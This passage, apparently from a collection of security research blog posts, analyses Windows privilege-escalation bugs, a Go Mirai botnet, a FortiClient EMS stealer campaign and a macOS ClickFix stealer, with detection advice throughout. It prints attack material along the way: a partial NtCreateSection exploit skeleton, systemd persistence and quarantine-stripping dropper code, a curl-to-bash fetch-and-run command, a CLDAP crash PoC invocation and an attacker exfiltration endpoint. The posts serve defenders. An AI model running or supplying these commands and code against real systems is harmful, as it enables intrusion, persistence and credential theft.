For context on how fast this turns operational: SpiderLabs and SecurityWeek both tie earlier Nightmare-Eclipse tools (BlueHammer, patched as CVE-2026-33825, plus the still-unpatched RedSun and UnDefend) to hands-on-keyboard intrusions within days of release, staged behind compromised FortiGate SSL VPN credentials from Russia-geolocated source IPs. GreenPlasma slots into that same kill chain as a third independent path to SYSTEM, used when Defender-targeting routes like BlueHammer and RedSun don't apply.

## A rough sketch of the chain

I'm not going to publish the missing weaponization, but the public shape looks like this:

```c
// 1. Run as a standard, unprivileged user. No admin, no UAC.
// 2. Create a named section in the object-manager namespace where
//    CTFMON will resolve it as trusted input-framework shared memory.
HANDLE hSection;
NtCreateSection(&hSection,
                SECTION_ALL_ACCESS,
                &objAttr,        // OBJECT_ATTRIBUTES naming the planted path
                &maxSize,
                PAGE_READWRITE,
                SEC_COMMIT,
                NULL);

// 3. Registry + ACL manipulation steers ctfmon (SYSTEM) to open
//    THIS section instead of the legitimate one.
// 4. Map it, write attacker-controlled bytes.
PVOID base = NULL;
SIZE_T viewSize = 0;
NtMapViewOfSection(hSection, GetCurrentProcess(), &base, 0, 0,
                   NULL, &viewSize, ViewShare, 0, PAGE_READWRITE);

// 5. CTFMON maps and trusts the same section in SYSTEM context.
//    The CTF gap: shape the contents so CTFMON's use of them
//    yields SYSTEM code execution.
```

The interesting research question is what exactly CTFMON does with that mapped data that becomes a control-flow primitive. That's the flag Nightmare-Eclipse is dangling, and I'd bet the answer is something dull like a function pointer or a length field that should never have been writable from a low box.

## What to do before Microsoft ships a fix

There's no patch, so this is detection and hardening, not remediation. Baseline the SHA-256 of C:\Windows\System32\ctfmon.exe now and alert on any deviation, even though the realistic attack leaves the binary alone. The signal you actually want is behavioral: ctfmon.exe spawning unexpected child processes, ctfmon interacting with or creating section objects it doesn't normally touch, or ctfmon crashing, which is a classic tell of a botched section swap. Feed object-manager telemetry into your EDR and write a rule for arbitrary section creation in non-user namespaces by a standard-user token, because that is the load-bearing step here.

Block execution from user-writable staging directories with ASR rules, since every confirmed Nightmare-Eclipse intrusion staged payloads out of Pictures and Downloads subfolders. Alert on a process literally named GreenPlasma.exe and its obvious renames. Audit your FortiGate and other SSL VPN logs for off-hours or geographically improbable logins, because that has been the front door for this crew every time. And set a calendar reminder to watch Microsoft's out-of-band channel ahead of June's Update Tuesday, plus the Nightmare-Eclipse GitHub account, since he has been explicit that more drops are coming on a Patch Tuesday cadence.

Treat GreenPlasma as live. The dangerous half is already public, and the other half is a weekend project for the wrong person.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="015" type="security-research-post">
<FRONTMATTER>
TITLE      : A Go Mirai Variant That Hides Behind cpufreqd
DATE       : 2026-06-02
URL        : https://garrettstimpson.ca/posts/2026/06/02/go-mirai-cpufreqd-systemd-disguise/
CVE        : none
CATEGORIES : malware, analysis
TAGS       : mirai, golang, linux, ddos, systemd-persistence, mitre-attack
WORD_COUNT : 1392
EXCERPT    : A fresh Go DDoS bot showed up on Bazaar masquerading as a Linux power daemon, floods with fasthttp, and forgot to strip its symbols.
</FRONTMATTER>
<BODY>
## What showed up

On June 1st a reporter going by NullBlue67 dropped two ELF binaries onto MalwareBazaar, both first seen around 16:59 UTC. One is built for x86_64, the other for ARM aarch64. The arm64 file is named `c2c_agent_arm64.elf`, weighs in at about 9.1 MB, and carries the SHA256 `5bf67d64e94a8ed6b81a0855fee52626eb0f4caf1772518fc2404883030451c2`. Bazaar tags it Mirai, with six vendor detections and a `new-family` label. Sample page is here for reference: [https://bazaar.abuse.ch/sample/5bf67d64e94a8ed6b81a0855fee52626eb0f4caf1772518fc2404883030451c2/](https://bazaar.abuse.ch/sample/5bf67d64e94a8ed6b81a0855fee52626eb0f4caf1772518fc2404883030451c2/). To be clear, that hash is for identification only, not a download.

What caught my eye is the rest of the tag set: `go`, `http-flood`, `cpufreqd-disguise`. This is not the usual C-compiled Mirai droplet that a thousand IoT cameras already host. It is a Go program, and the honeypot operator left a comment that fills in the gaps nicely. Captured over SSH, origin Spain, internal module name `c2c/cmd/agent`, HTTP flood implemented with the `fasthttp` library, and persistence through a systemd unit pretending to be `cpufreqd`. Go 1.26.3. Debug info not stripped. That last detail is going to matter.

## What makes it work

Start with how it stays alive. The bot installs itself as a systemd service, and it picks the name `cpufreqd` on purpose. `cpufreqd` is a real, old Linux daemon that adjusts CPU frequency based on policy. Most admins have heard the name, few have it actually installed, and almost nobody audits it. So a unit file sitting at `/etc/systemd/system/cpufreqd.service` or under `/usr/lib/systemd/system/` reads as boring infrastructure. That is the whole trick. MITRE files this under T1543.002 (Create or Modify System Process: Systemd Service) combined with T1036.005 (Masquerading: Match Legitimate Name or Location). Systemd executes whatever `ExecStart` points at on every boot, runs it as root if the unit lives in the system directories, and restarts it for you if it dies. The attacker gets free reliability engineering from the OS.

Getting on the box in the first place was nothing clever. It landed on an SSH honeypot, which means credential brute forcing or a reused password, T1110. Commodity entry, commodity foothold. The interesting part is what runs after.

The payload is a DDoS agent. It dials home to its C2 over a web protocol (T1071.001) and waits for flood commands. The honeypot operator named two of them, `directhttp` and `betterhttp`, and both ride on `fasthttp`. The choice of library is deliberate. Go's standard `net/http` is fine, but `fasthttp` is built to minimize allocations and reuse connection objects, so a single modest VPS can push request volumes that hurt. Layer 7 floods like this fall under T1498 (Network Denial of Service), and they are nasty precisely because each request looks like a real request. Cloudflare and others have been reporting that the bulk of HTTP-layer attacks in 2025 were short and intense, most finishing inside ten minutes, long enough to lock users out and fail transactions while staying under the radar of slow human response.

Why Go at all? Cross compilation. One `GOOS=linux GOARCH=arm64 go build` and you have an arm64 binary; flip the arch and you have x86_64. That is exactly why we got two architectures in the same upload. Mirai has always wanted to be everywhere, and Go makes "everywhere" a build flag instead of a toolchain headache. The Darkreading crowd noticed this shift a while back when Mirai-lineage actors started rewriting controllers and then bots in Go for reach.

Now the part that made me laugh. The author did not strip the binary. In a Go ELF, the function metadata lives in the `gopclntab` section whether or not you strip the regular symbol table, so even a stripped Go binary leaks structure. This one did not even bother. The `c2c/cmd/agent` module path is right there. Tools like Radare2 or the go-re toolkit parse `gopclntab` automatically on Linux Go binaries and hand you function names, so an analyst opens this and gets a near-source-level map of the command handlers. For a botnet author that is a real OPSEC miss. It tells me this is either early development, a hobbyist, or someone who simply does not care because the bot is disposable. Given the `new-family` tag, my money is on early development.

## Local educational sample

Here is the persistence idea, written in Go, stripped of anything harmful. It writes a unit named `cpufreqd-demo` whose `ExecStart` is `/bin/true`, so it does nothing. The point is to show the file layout and the systemd handoff, not to ship a payload.

```go
// EDUCATIONAL SAMPLE - demonstrates systemd service masquerade (T1543.002 / T1036.005)
// This does NOT contain any malicious payload
// For research and defensive awareness only
package main

import (
	"os"
	"os/exec"
)

const unit = `[Unit]
Description=CPU Frequency Daemon (demo, harmless)

[Service]
Type=simple
ExecStart=/bin/true
Restart=always

[Install]
WantedBy=multi-user.target
`

func main() {
	// Real malware writes to /etc/systemd/system to blend with system services.
	// We write a clearly named demo unit so nobody confuses this with the real thing.
	path := "/etc/systemd/system/cpufreqd-demo.service"
	if err := os.WriteFile(path, []byte(unit), 0644); err != nil {
		panic(err)
	}
	// systemd reads the unit, enables boot persistence, and starts it.
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "--now", "cpufreqd-demo.service").Run()
	// Cleanup: systemctl disable --now cpufreqd-demo && rm the unit file.
}
```

And the flood primitive, reduced to a single honest request so you can see the `fasthttp` shape without the loop that turns it into an attack.

```go
// EDUCATIONAL SAMPLE - demonstrates the fasthttp request primitive only
// No flood loop, no concurrency, no target list. One request to one host.
// For research and defensive awareness only
package main

import (
	"fmt"

	"github.com/valyala/fasthttp"
)

func main() {
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseRequest(req)
	defer fasthttp.ReleaseResponse(resp)

	req.SetRequestURI("https://example.com/")
	req.Header.SetMethod("GET")

	if err := fasthttp.Do(req, resp); err != nil {
		panic(err)
	}
	fmt.Println("status:", resp.StatusCode())
}
```

The weaponized version wraps that primitive in a goroutine pool driven by C2 commands. The defensive lesson is that the request itself is indistinguishable from legitimate traffic. You defend against the volume and the source, not the packet.

## Detection and defense

The sample lit up twenty YARA rules on Bazaar, most of them generic Go detectors like `DetectGoMethodSignatures`, `Suspicious_Golang_Binary`, and CYFARE's `TH_Generic_MassHunt_Linux_Malware_2026`. Generic is fine here. A small rule keyed to the masquerade plus the module path catches this specific family:

```yara
rule Go_Mirai_cpufreqd_disguise
{
    meta:
        author = "Garrett Stimpson"
        description = "Go DDoS agent masquerading as cpufreqd systemd service"
        reference = "MalwareBazaar 5bf67d64...30451c2"
    strings:
        $mod  = "c2c/cmd/agent"
        $svc  = "cpufreqd"
        $cmd1 = "directhttp"
        $cmd2 = "betterhttp"
        $go   = "go1.26"
    condition:
        uint32(0) == 0x464c457f and $mod and $svc and ($cmd1 or $cmd2) and $go
}
```

On the host, Sysmon for Linux is your friend. Event ID 1 (process creation) catches the agent spawning and, just as useful, catches `systemctl enable` and `systemctl daemon-reload` running with a parent that is not a package manager or an admin shell. Event ID 3 (network connection) catches the outbound C2 dial and the flood traffic leaving the box. Pair those two and you have the full story from install to attack.

Watch the systemd directories directly. An auditd watch on `/etc/systemd/system/` and `/usr/lib/systemd/system/` flags new `.service` files as they are written. Then verify ownership: a real distro daemon belongs to a package, so `dpkg -S /etc/systemd/system/cpufreqd.service` or `rpm -qf` returning "no package owns" on something claiming to be `cpufreqd` is your tell. There are public Sigma rules for systemd service creation under the auditd category that map cleanly onto this. For mitigation, the boring advice is the advice that works: kill password SSH and use keys, put fail2ban or equivalent in front of the daemon, and filter egress so a compromised host cannot reach arbitrary C2 or pour L7 floods outward. The bot needs the network to matter. Take the network away.

This one is not sophisticated. It is a clean example of where commodity Linux malware is heading, though: Go for portability, a legitimate service name for cover, and a fast HTTP library doing the loud work. The unstripped symbols are a gift. Read them while they last.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="016" type="security-research-post">
<FRONTMATTER>
TITLE      : CVE-2026-41089: One CLDAP Packet Reboots Your Domain Controller, And Microsoft Said It Was Unlikely
DATE       : 2026-06-02
URL        : https://garrettstimpson.ca/posts/2026/06/02/cve-2026-41089-netlogon-cldap-stack-overflow-rce/
CVE        : cve-2026-41089, CVE-2026-41089
CATEGORIES : exploits, windows
TAGS       : cve-2026-41089, netlogon, cldap, buffer-overflow, active-directory, rce
WORD_COUNT : 1122
EXCERPT    : A byte-versus-WCHAR mixup in Netlogon lets one unauthenticated UDP packet overflow a 528-byte stack buffer in LSASS. Microsoft rated it less likely to be exploited. It is being exploited.
</FRONTMATTER>
<BODY>
Here is what gets me about this one. Microsoft shipped the patch for CVE-2026-41089 on May 12 and tagged it "Exploitation Less Likely." Nineteen days later the Centre for Cybersecurity Belgium put out an alert saying it is being hit in the wild. A pre-auth, zero-credential, network-reachable bug on the one box that holds your entire Active Directory forest together. Less likely. Sure.

I want to walk through why this bug is so clean, because the root cause is the kind of thing you learn about in week one and then spend a career watching ship anyway. It is a unit confusion. Bytes versus WCHARs. That is the whole crash.

## The vulnerable path

Netlogon answers DC locator pings. When a client wants to find a domain controller it sends a CLDAP request, which is just LDAP riding on top of UDP port 389. No TCP handshake, no bind, no authentication. You send a datagram, the DC builds a response describing itself, and it sends one back. This is by design. It has to work before a machine has any credentials, which is exactly why it makes such a good target.

The response gets built here:

```
I_NetLogonLdapLookupEx
  -> NlGetLocalPingResponse        // allocates Src[528], a 528-byte stack buffer
    -> LogonRequestHandler
      -> BuildSamLogonResponse
        -> NetpLogonPutUnicodeString  // writes strings into the buffer
```

`NlGetLocalPingResponse` puts a 528-byte buffer on the stack. Then `BuildSamLogonResponse` packs the response into it: the server name, the domain name, a couple of GUIDs, DNS names, and the username the client asked about. Each of those goes through `NetpLogonPutUnicodeString`.

The bug lives in that last function. It receives a maximum length that the caller computed in bytes. It then treats that number as a count of WCHARs. A WCHAR is two bytes. So every bounds check is off by a factor of two, in the attacker's favor. The function thinks it has twice the room it actually has.

Most of the fields in the response are fixed or short. The server name and domain name are whatever the DC is actually called. But one field is attacker controlled and it is generous about length. The `User` attribute in the CLDAP filter. The DC locator protocol lets you ping for a specific user, and that string gets copied straight into the response buffer. You are allowed up to 130 WCHARs there, which is 260 bytes on the wire. Combine that with the server name, the domain name, and the GUIDs, and the total write sails past the 528-byte boundary. The return address on the stack goes with it.

## The packet

There is nothing exotic about triggering it. You build a normal CLDAP search request, the kind any domain-joined machine sends a hundred times a day, with a filter like:

```
(&(DnsDomain=corp.local)(User=AAAA...130 chars...)(NtVer=...))
```

The public PoC from 0xABCD01 is plain Python with no dependencies, just `socket` and `struct` hand-rolling the BER encoding. It runs in three phases. Send a benign ping with a short username to confirm the DC is up and answering on UDP 389. Send the same packet again with a 130-character username of `A`s. Then wait a few seconds and ping once more. If the second ping gets no answer, LSASS went down.

```
python3 poc.py 10.0.50.21 corp.local -l 130
```

When LSASS crashes on a domain controller, the box reboots itself in about sixty seconds. That is the behavior the public exploit demonstrates: a denial of service that takes a DC offline on demand, repeatedly, from an unauthenticated position. The author was clear that the current code stops at the crash and does not go for code execution.

That last point is where I want to be careful, because the headlines all say RCE and the CVSS vector says RCE, but what is publicly weaponized right now is the reboot. The overflow corrupts the stack, and a stack overflow of this shape is the classic precursor to code execution. Whether the in-the-wild activity CCB is seeing is someone knocking DCs over or someone who has quietly closed the gap to a shell, nobody outside the affected orgs has said. I would not bet on it staying a DoS. Stack smashes inside LSASS have a long history of growing teeth.

## Who is exposed

Any Windows Server acting as a domain controller, from 2012 through 2025. The fixed builds from the May update:

```
Server 2016        10.0.14393.9140
Server 2019        10.0.17763.8755
Server 2022        10.0.20348.5074
Server 2022 23H2   10.0.25398.2330
Server 2025        10.0.26100.32772
```

2012 and 2012 R2 only get the fix through ESU. If you are running DCs that old and out of extended support, you have a different conversation to have with yourself.

## What to actually do

Patch the domain controllers. All of them, in the same maintenance window. There is no graceful half-measure here. A forest with some DCs patched and some not is still a forest you can reboot at will, and a pre-auth DC bug does not respect your rollout schedule. Automox's Jason Kikta put it well: half-patched forests are not a defensible state for this class of bug.

If you genuinely cannot patch a box right now, restrict inbound UDP 389 so only your trusted management subnets can reach the Netlogon CLDAP listener. CLDAP from a random workstation VLAN to a DC is not normal traffic. For legacy servers past ESU, 0patch shipped a micropatch. Their fix is a single instruction, `mov edx, 0x40`, which halves the max username length back to what it should have been. It is a satisfying reminder of how small the actual defect is.

For detection, two signals. On the network, watch for CLDAP search requests where the `User` filter attribute runs longer than 20 or 30 characters. Real DC locator pings carry short service account names, not 130 bytes of padding. On the host, watch for LSASS crashes tied to netlogon.dll, Event ID 1000, and treat any unexplained DC reboot as suspicious until proven otherwise. You can turn up Netlogon's own logging:

```
nltest /dbflag:0x2080ffff
```

The thing I keep coming back to is the severity call. A network-reachable, unauthenticated overflow on a domain controller got rated less likely to be exploited, and the patch was public, and patch diffing is a solved problem, and AI tooling has made root-cause reversing a same-week affair. Aretiq had a public reverse engineering writeup out almost immediately. The window between a DC patch shipping and someone shooting at the unpatched ones is now measured in days. Plan your patching like that is true, because for this one it was.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="017" type="security-research-post">
<FRONTMATTER>
TITLE      : CVE-2026-35616: When the Patch Server Ships the Malware
DATE       : 2026-06-02
URL        : https://garrettstimpson.ca/posts/2026/06/02/cve-2026-35616-forticlient-ems-ekz-infostealer/
CVE        : cve-2026-35616, CVE-2026-35616
CATEGORIES : exploits, malware, analysis
TAGS       : forticlient-ems, cve-2026-35616, ekz-infostealer, on-connect, app-bound-encryption, supply-chain
WORD_COUNT : 1182
EXCERPT    : An auth bypass in FortiClient EMS let attackers turn the endpoint management server into a delivery truck, pushing a credential stealer disguised as a Fortinet patch to every managed device at once.
</FRONTMATTER>
<BODY>
The thing I keep coming back to with this campaign is the lure. The payload was named FortiEndpoint_Patch.exe. The attackers got in through an unpatched FortiClient EMS, then handed every managed endpoint a fake patch. A patch problem, exploited, used to deliver a fake patch. Whoever ran this had a sense of humor about it.

Arctic Wolf published the details on May 27, and it deserves more attention than it got, because the tradecraft here is the kind that quietly wrecks a whole fleet. The bug is CVE-2026-35616, an improper access control flaw in FortiClient Endpoint Management Server. CVSS 9.1, unauthenticated, remote. Fortinet shipped out-of-band hotfixes back in early April after confirming zero-day exploitation, CISA put it on the KEV list the same month, and the permanent fix landed in EMS 7.4.7. None of that stopped operators from finding the boxes that were still behind.

## The bug is boring. The blast radius is not.

Let me be honest about the vulnerability itself. It is not clever. It is an API authentication bypass, tracked under CWE-284. You send specially crafted HTTP requests to certain EMS endpoints without valid credentials, and the server processes them as if a legitimate administrator made them. That is the whole bug. No memory corruption, no exotic primitive. The flaw was reported to Fortinet on March 31, 2026 after it was already being abused in the wild.

What makes it matter is what EMS is. FortiClient EMS is the central brain for managing FortiClient endpoints: policies, VPN profiles, configuration, the lot. Get admin on EMS and you do not need a separate intrusion path to each device. You have one already, built in, trusted, and humming. Every managed endpoint becomes a target the moment you can edit the management config. That is the difference between a single compromised server and a fleet-wide incident.

If you want to know whether someone tried this against your EMS, the exploitation leaves a tell in the logs. Arctic Wolf saw this line on every attempt:

```
Certificate not found in request header.
```

In real intrusions, within seconds, it was followed by:

```
Certificate user: fortinet-ca2 FortiGate: Fabric device (SN=fortinet-ca2) successfully updated
```

There is a public nuclei template for CVE-2026-35616 that produces the first line regardless of patch status, so the certificate error alone is not proof of compromise. The pair, error then a fabric-device update seconds later, is the high-signal combination. Early logins in this campaign came from Tor exit nodes, including 185.220.101.15 and 192.42.116.14.

## Living off the management plane

Here is the part worth studying. After gaining privileged access to EMS, the operators did not drop a web shell or scramble for persistence. They edited the Remote Access Profile and the endpoint policy. FortiClient EMS lets administrators define scripts that run automatically on an endpoint when a VPN tunnel comes up, using the `on_connect` and `script` directives in the XML profile. This is a documented, legitimate feature meant for things like mapping drives after a tunnel establishes. The attackers just used it as designed, pointed at their own code.

Within seconds of a managed endpoint bringing up its IPsec tunnel, fortitray.exe launched a .cmd file through cmd.exe. The script sat where almost nobody looks, inside the VPN troubleshooting log directory:

```
C:\Program Files\Fortinet\FortiClient\logs\Trace\scripts\{GUID}.cmd
```

That .cmd decoded a base64 PowerShell blob. The PowerShell pulled a payload from the attacker VPS using a few fallback download methods, ran it, slept 90 seconds, then POSTed the output back to 83.138.53.110. The process tree is clean and worth memorizing, because it is the detection:

```
fortitray.exe or ipsec.exe
  └── cmd.exe
        └── powershell.exe (downloader)
              └── FortiEndpoint_Patch.exe (credential stealer)
```

PowerShell spawned by fortitray or the IPsec helper, reaching out to a raw IP over HTTP right after a tunnel comes up, is not something a healthy endpoint does. If you have any EDR telemetry at all, that lineage is your hunt.

## EKZ, the stealer nobody had seen

The payload is a previously unreported browser credential stealer that Arctic Wolf named EKZ, after symbol strings left in the decrypted code. It is delivered as p.exe and lands as FortiEndpoint_Patch.exe. It is a MinGW-w64 build, GCC with DWARF debug info still attached, PE32+ console binary, 4,019,070 bytes, with a zeroed PE timestamp for anti-attribution. SHA-256 0da123adf9251957a4b850a3f6bd6a753dd4892be176a84a18450e899534cc5e. It even ships a CLI with verbs like action_list, view, label, and export, plus a SQLite results store, which tells you it was built for repeated hands-on-keyboard use across many hosts, not a fire-and-forget dropper.

The Chromium credential theft is the technically interesting bit, because it bothers to defeat app-bound encryption. EKZ reads the `os_crypt.app_bound_encrypted_key` out of the browser's Local State file, copies itself into the browser's own Application directory, and relaunches from that path so it passes the Chromium Elevation Service path validation. From there it calls IElevator::DecryptData to recover the Chromium v20 AES-256 master key and decrypts every profile's SQLite stores. For Firefox and other Gecko browsers it loads nss3.dll directly and reads key4.db, logins.json, and cookies.sqlite, the last of which sits in plaintext anyway.

It takes passwords, autofill data like cards and addresses, and, the dangerous one, cookies. Stolen session cookies let an attacker resume an already-authenticated session, which can sidestep MFA entirely. The harvest goes to a log file in ProgramData, then PowerShell ships it to hxxp://83.138.53.110/service/save.php on a timer and cleans up the local artifacts.

## What to actually do

Patch EMS. If you are on 7.4.5 or 7.4.6, the hotfixes have been out since April and 7.4.7 carries the permanent fix. There is no reason to still be exposed in June. While you are at it, lock down the EMS management port, 8013, to trusted IP ranges only. An internet-reachable EMS is a fleet waiting to be reconfigured, and Shadowserver counted around 2,000 exposed instances when this started.

For hunting, do not trust file integrity checks. The action is in configuration and in memory. Look for the certificate-error-then-fabric-update log pair on EMS, any `on_connect` script additions to Remote Access Profiles you did not make, and that scripts subdirectory under the FortiClient Trace logs. On endpoints, alert on PowerShell parented by fortitray.exe or ipsec.exe, anything executing out of ProgramData right after a VPN connect, and HTTP traffic to 83.138.53.110. Arctic Wolf published the full IOC set on their GitHub.

The lesson is not really about Fortinet. It is that your management tooling is your most valuable target, because it is trusted by everything it touches. When the thing that pushes your patches gets popped, it can push anything. Treat the consoles that control your fleet like the crown jewels they are, because the people breaking in already do.
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="018" type="security-research-post">
<FRONTMATTER>
TITLE      : Infiniti Stealer: ClickFix Meets a Nuitka-Compiled Python Stealer on macOS
DATE       : 2026-06-01
URL        : https://garrettstimpson.ca/posts/2026/06/01/infiniti-stealer-clickfix-nuitka-macos/
CVE        : none
CATEGORIES : malware, analysis
TAGS       : infiniti-stealer, nukechain, clickfix, macos, stealer, nuitka, mitre-attack
WORD_COUNT : 1507
EXCERPT    : A macOS stealer that ships its Python payload as a native Mach-O binary, delivered through a fake Cloudflare CAPTCHA that asks you to paste a command into Terminal yourself.
</FRONTMATTER>
<BODY>
## What showed up

I have written about macOS ClickFix before. The SHub/MacSync family, the AppleScript pivot after Apple killed the Terminal-paste trick in Tahoe. So when I saw Malwarebytes document a stealer they first tracked as NukeChain, then renamed Infiniti once the operator panel leaked its own name, I almost filed it under "more of the same." Then I read how it ships the payload, and it stopped being boring.

This is, as far as anyone has documented, the first macOS campaign that pairs ClickFix delivery with a Python stealer compiled by Nuitka into a native binary. Not PyInstaller. Nuitka. That difference is the whole story, and I will get to why it matters.

The infection starts at `update-check[.]com`, a near-perfect clone of a Cloudflare human-verification page. The final stealer, `UpdateHelper.bin`, is a Python 3.11 payload compiled to an Apple Silicon Mach-O.

SHA256 (Stage 3): `1e63be724bf651bb17bcf181d11bacfabef6a6360dcdfda945d6389e80f2b958`
C2 panel: `Infiniti-stealer[.]com`

Apple's built-in XProtect did not flag the early samples, which is the usual reason these families stay alive. The Malwarebytes writeup by Stefan Dasic is the primary source here, with binary analysis credited to Marcelo Rivero.

## What makes it work

The delivery half is pure social engineering. ClickFix does not exploit a bug. It exploits you. MITRE tracks it as T1204.004, Malicious Copy and Paste, added to ATT&CK in March 2025 once this stopped being a curiosity and became a wave.

The fake CAPTCHA tells the visitor to press Command + Space, open Terminal, and paste a "verification" command. That command is deliberately ugly so nobody reads it:

```
bash <(curl -sSfL $(echo aHR0cHM6...d5 | base64 --decode))
```

The base64 blob decodes to a URL on the same domain. `curl` pulls a first-stage Bash script, and `bash <(...)` runs it straight from the process substitution without ever writing the dropper to disk. Because you typed it, there was no malicious download, no attachment, no exploit. Gatekeeper has nothing to inspect. This is T1059.004, Unix shell execution, kicked off by your own hands.

Stage 1 is a Bash dropper built from a template seen in earlier MacSync/SHub samples, which points at a shared builder being sold or reused. Its job list is short and effective. Decode an embedded payload, write the Stage-2 binary into `/tmp`, strip the quarantine flag with `xattr -dr com.apple.quarantine`, then launch the binary with `nohup` while passing the C2 address and an auth token as environment variables. After that it deletes itself and closes Terminal with an AppleScript call so the victim sees nothing linger. That quarantine removal is the quiet part. It is MITRE T1553.001, Gatekeeper Bypass, and it is the line that defenders should care about most, because legitimate software almost never strips its own quarantine attribute.

Stage 2 is where it gets interesting. The dropped Mach-O is about 8.6 MB, built with Nuitka in onefile mode. Its header carries the signature bytes `4b 41 59 28 b5 2f fd`, which read as `KAY (` followed by a zstd magic number. Nuitka packs the application as a zstd-compressed archive behind that marker. Here is why I care: PyInstaller bundles your `.pyc` files and an interpreter, so an analyst can carve them out and decompile in minutes. Nuitka actually compiles Python into C and then into a native binary. There are no neat `.pyc` files to lift. Static analysis turns into reading compiled C with Python's object model smeared all over it. At runtime the loader inflates roughly 35 MB of embedded data and runs the real payload. It is more work to build and far more annoying to take apart, and that tradeoff is exactly what a stealer-as-a-service operator wants.

Stage 3 is the Python 3.11 stealer itself. Even compiled, it leaks thousands of named symbols, so the module layout can be partly rebuilt, which is the one mercy here. What it takes is the standard infostealer shopping list, executed thoroughly. Credentials from Chromium browsers and Firefox (T1555.003). macOS Keychain entries (T1555.001). Cryptocurrency wallets. Plaintext secrets sitting in developer files like `.env`, which is a pointed choice given how many engineers keep live API keys there. It grabs screenshots during execution (T1113) and ships everything out over HTTP POST (T1071.001).

Before it steals anything it checks where it is running. It looks for any.run, Joe Sandbox, Hybrid Analysis, VMware, and VirtualBox, and it adds a randomized execution delay to outlast automated sandboxes that only watch a sample for a minute or two. That is T1497, virtualization and sandbox evasion. When exfiltration finishes, a function named `upload_complete()` fires a Telegram notification to the operator and queues the stolen credentials for server-side password cracking. The operators are not just collecting. They are running a pipeline.

So how clever is this, really? The ClickFix front end is commodity. We have seen it for two years. The Nuitka backend is the part worth respecting, in the way you respect a competent burglar. It is not novel computer science. It is a smart packaging decision that buys real time against analysts and AV. Lazy malware reuses a builder and calls it a day. This one reused a builder and then made the payload genuinely harder to read. That is a step up.

## Local educational sample

Here is the delivery technique, the quarantine-removal trick specifically, with the payload replaced by something harmless. Reading this teaches you the shape of the dropper without handing anyone a weapon.

```bash
#!/usr/bin/env bash
# EDUCATIONAL SAMPLE - demonstrates the macOS quarantine-removal dropper pattern
# This does NOT contain any malicious payload
# For research and defensive awareness only

# Real droppers decode an embedded blob here. We write a benign script instead.
STAGE2="/tmp/.demo_helper"
cat > "$STAGE2" <<'EOF'
#!/bin/bash
echo "If this were malware, Stage 2 would run now."
open -a TextEdit   # benign stand-in for the real payload
EOF
chmod +x "$STAGE2"

# THE TECHNIQUE TO WATCH:
# Stripping com.apple.quarantine so Gatekeeper never prompts on the dropped file.
# Legitimate installers do not do this to their own files.
xattr -dr com.apple.quarantine "$STAGE2"   # MITRE T1553.001 - Gatekeeper bypass

# Launch detached, the way the real dropper uses nohup to survive Terminal closing.
nohup "$STAGE2" >/dev/null 2>&1 &

# Real samples self-delete and close Terminal via AppleScript to hide the trail.
# rm -- "$0"   # left commented so this demo stays inspectable
```

Two lines carry the lesson. The `xattr -dr com.apple.quarantine` call is the defensive tripwire, and `nohup ... &` is how the payload outlives the Terminal window the victim is about to close.

## Detection and defense

You catch this with process telemetry, not file scanning, because the early stages never sit still on disk long enough. Apple's Endpoint Security Framework is the right source. Wire ESF process-creation events into your EDR or a Sysmon-for-macOS deployment and alert on a few specific patterns.

Watch for `xattr` invoked with `-d` or `-dr` and `com.apple.quarantine` by any process that is not a known installer. Elastic ships a rule for exactly this, "Quarantine Attrib Removed by Unsigned or Untrusted Process," and it is a high-signal detection. Watch for `bash` or `zsh` spawned with a `curl` process substitution as a parent chain, which is the ClickFix paste fingerprint. Watch the `security` binary being called with `dump-keychain`, `find-generic-password`, or `export-keychain`, the classic Keychain harvest (T1555.001). And flag any fresh executable spawned out of `/tmp` under `nohup`.

On the file side, the IOCs are concrete. The dropper drops a debug log at `/tmp/.bs_debug.log` and stages the binary under `/tmp/.2835b1b5098587a9` with a random suffix. Hunt those. For YARA, the Nuitka onefile marker is a clean anchor: the byte sequence `4b 41 59 28 b5 2f fd`, the `KAY (` plus zstd magic, in a Mach-O. That will not catch every Nuitka binary as malicious, but combined with a small file size and an origin in `/tmp` it is a strong hunt. Also sweep `~/Library/LaunchAgents/` for persistence that does not belong.

Mitigations are mostly about the human in the loop. No legitimate CAPTCHA has ever asked anyone to open Terminal and paste a command. Say that to your users until they are sick of hearing it. For fleets, restrict who can run `xattr` and `curl | bash` patterns where you can, keep XProtect and the OS current so the platform-level ClickFix mitigations from Tahoe stay in force, and treat any developer machine with loose `.env` hygiene as a credential-leak waiting to happen. The fix for the Terminal-paste vector exists at the OS level now. The fix for the people pasting commands is education, and that one never fully ships.

Sample reference (do not download): [https://www.malwarebytes.com/blog/threat-intel/2026/03/infiniti-stealer-a-new-macos-infostealer-using-clickfix-and-python-nuitka](https://www.malwarebytes.com/blog/threat-intel/2026/03/infiniti-stealer-a-new-macos-infostealer-using-clickfix-and-python-nuitka)
</BODY>
</DOCUMENT>

--------------------------------------------------------------------------------

<DOCUMENT id="019" type="security-research-post">
<FRONTMATTER>
TITLE      : CVE-2026-20817: The WER Service Will Launch SYSTEM Processes For Anyone Who Asks
DATE       : 2026-06-01
URL        : https://garrettstimpson.ca/posts/2026/06/01/cve-2026-20817-wer-alpc-svcelevatedlaunch-lpe/
CVE        : CVE-2026-20817, cve-2026-20817
CATEGORIES : exploits, windows
TAGS       : cve-2026-20817, alpc, privilege-escalation, wer, lpe
WORD_COUNT : 1052
EXCERPT    : Windows Error Reporting exposes an ALPC method that spawns WerFault.exe with an attacker-controlled command line, as SYSTEM, with no caller check at all.
</FRONTMATTER>
<BODY>
Most of the Windows local privilege escalation bugs I read about lately are races. Some narrow window where you flip a handle or a token before the kernel notices. They are clever, they are fragile, and writing about them means a lot of caveats about reliability. CVE-2026-20817 is not that. This one is a logic bug, and once you see it you cannot unsee it. The Windows Error Reporting service has an ALPC method that takes a command line from the caller and launches a process with it. As SYSTEM. And it forgets to ask who the caller is.

That is the whole bug. Let me walk through why it works.

## The ALPC surface nobody looks at

WER runs as a service under a SYSTEM token. To talk to other processes it opens an ALPC port called `\WindowsErrorReportingService`.
